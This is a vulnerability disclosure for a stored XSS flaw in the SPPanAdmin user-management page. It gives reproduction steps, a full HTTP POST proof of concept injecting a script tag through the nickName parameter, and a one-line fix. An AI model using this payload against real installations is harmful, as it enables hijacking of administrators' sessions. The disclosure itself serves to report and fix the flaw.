# Stored-XSS-vulnerability-in-the-background-management-page-of-the-SSPanAdmin-system-
Vulnerability disclosure

Vulnerability title: stored XSS vulnerability in the background management page of the SSPanAdmin system 

Product: https://github.com/reckcn/SPPanAdmin

Affected Versions: all 

Discovery time: 2022.5.3 

Found by: solarpeng502 

Exploit sence: The System allows multiple users to log in. If a user is granted user management rights, he can insert a malicious xss payload on this page, so that all users with this permission can access and trigger an xss attack

Analysis report:  

1. Vulnerability link: http://xxx.xxx.xxx.xxx/admin/user/edit, the parameters causing the vulnerability are nickName, telephone, address 
2. After deployment, enter the background management page 
3. Enter System Management -> User Management, select any user and click Modify 
![image](https://user-images.githubusercontent.com/37793491/166433056-25aabbb8-c1fb-4f4b-9992-009df67850d4.png)
5. Use the packet capture tool to capture the packet (burp is used here). After capturing, modify any parameter of nickName, telephone and address to be the xss payload. Here use nickname and the payload is <script>alert(1)</script> 
![image](https://user-images.githubusercontent.com/37793491/166434993-f03772cf-48cc-4d23-8b9c-80e549c3890c.png)
6. Enter the User Management again, and find that the xss attack is triggered, a pop-up box, pop-up 1 
![image](https://user-images.githubusercontent.com/37793491/166433282-9619e35f-7bba-4925-bf3e-599744784945.png)


POC:

POST /admin/user/edit HTTP/1.1

Host: 192.168.0.105

Content-Length: 135

Accept: application/json, text/javascript, */*; q=0.01

X-Requested-With: XMLHttpRequest

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.13 Safari/537.36

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Origin: http://192.168.0.105

Referer: http://192.168.0.105/admin/user/edit/1

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7

Cookie: pageno_cookie=1; JSESSIONID=F799DC8A4D135A0A0A62A2805DFF6A18

Connection: close

id=1&userName=admin&nickName=<script>alert(1)</script>&sex=1&birthday=1213&telephone=123&email=123&address=123&locked=0&description=123

Fixes: 1. Escape or filter special characters and control characters such as <> in parameters
